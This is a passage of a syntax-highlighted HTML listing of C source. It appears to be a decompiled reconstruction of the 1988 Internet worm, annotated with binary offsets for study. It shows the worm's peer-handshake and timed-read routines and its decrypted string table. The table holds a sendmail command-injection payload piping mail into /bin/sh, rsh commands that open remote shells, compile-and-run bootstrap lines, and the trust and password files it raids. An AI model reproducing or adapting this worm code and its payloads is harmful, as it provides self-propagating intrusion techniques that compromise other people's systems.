        </span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">how_long</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">time</span><span class="sc10">(&amp;</span><span class="sc11">time1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">nfds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">other_fd</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">readmask</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">timeout</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nfds</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readmask</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">answer_other</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">time</span><span class="sc10">(&amp;</span><span class="sc11">time2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">time2</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">time1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">answer_other</span><span class="sc10">()</span><span class="sc0">               </span><span class="sc1">/* 0x5b14 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ns</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addrlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">magic_holder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">magic1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">magic2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    
    </span><span class="sc11">addrlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">ns</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">accept</span><span class="sc10">(</span><span class="sc11">other_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">addrlen</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* 620 */</span><span class="sc0">
    
    </span><span class="sc11">magic_holder</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAGIC_1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">magic_holder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic_holder</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic_holder</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">magic_holder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic_holder</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic_holder</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">magic_holder</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">MAGIC_2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">magic1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">magic1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">magic2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic2</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">magic2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"127.0.0.1"</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">magic1</span><span class="sc10">+</span><span class="sc11">magic2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">other_fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">other_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">pleasequit</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* A timeout-based read. */</span><span class="sc0">
</span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">)</span><span class="sc0">            </span><span class="sc1">/* 0x5ca8 */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readmask</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0"> </span><span class="sc11">timeout</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nfds</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">time1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time2</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">      </span><span class="sc1">/* 150 */</span><span class="sc0">
    </span><span class="sc11">readmask</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">readmask</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">timeout</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 156 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readmask</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* These are some of the strings that are encyphed in the binary.  The
 * person that wrote the program probably used the Berkeley 'xstr' program
 * to extract and encypher the strings.
 */</span><span class="sc0">
</span><span class="sc9">#ifdef notdef
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">environ</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"sh"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env52</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"sh"</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 0x20034, &lt;environ+52&gt; */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env55</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"-p"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env58</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"l1.c"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env63</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"sh"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env66</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/tmp/.dump"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env77</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"128.32.137.13"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env91</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"127.0.0.1"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env102</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/usr/ucb/netstat -r -n"</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc1">/* 0x20066 */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env125</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"r"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">env127</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"%s%s"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif </span><span class="sc1">/* notdef*/</span><span class="sc0">
</span><span class="sc1">/*
  char *text =
  "default
  0.0.0.0
  127.0.0.1
  exec /bin/sh
  l1.c
  PATH=/bin:/usr/bin:/usr/ucb
  cd /usr/tmp
  x%d.c
  echo gorch49;sed '/int zz;/q' &gt; %s;echo gorch50
  gorch49
  int zz;
  gorch50
  cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE
  DONE
  x%d,%s
  PATH=/bin:/usr/bin:/usr/ucb
  rm -f sh
  if [ -f sh ]
  then
  P=x%d
  else
  P=sh
  cc -o $P %s
  ./$P -p $$ 
  rm -f $P
  rm -f %s $P
  l1.c
  cd /usr/tmp
  x%d.c
  cat &gt; %s &lt;&lt;'EOF'
  cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c
  /usr/ucb/rsh
  /usr/bin/rsh
  /bin/rsh
  /bin/echo %s
  debug
  mail from:&lt;/dev/null&gt;
  rcpt to:&lt;"| sed '1,/^$/d' | /bin/sh ; exit 0"&gt;
  data
  quit
  quit
  exec /usr/ucb/rsh %s -l %s 'exec /bin/sh'
  /bin/sh
  /bin/sh
  127.0.0.1
  127.0.0.1
  /etc/hosts.equiv
  %.100s
  /.rhosts
  %.200s/.forward
  %.20s%.20s
  %[^ ,]
  %*s %[^ ,]s
  %.200s/.forward
  %.200s/.rhosts
  %s%s
  /usr/dict/words";
  */</span><span class="sc0">

</span><span class="sc1">/*
 * Local variables:
 * compile-command: "cc -S hs.c"
 * comment-column: 48
 * End:
 */</span><span class="sc0">
</span></div></body>
</html>
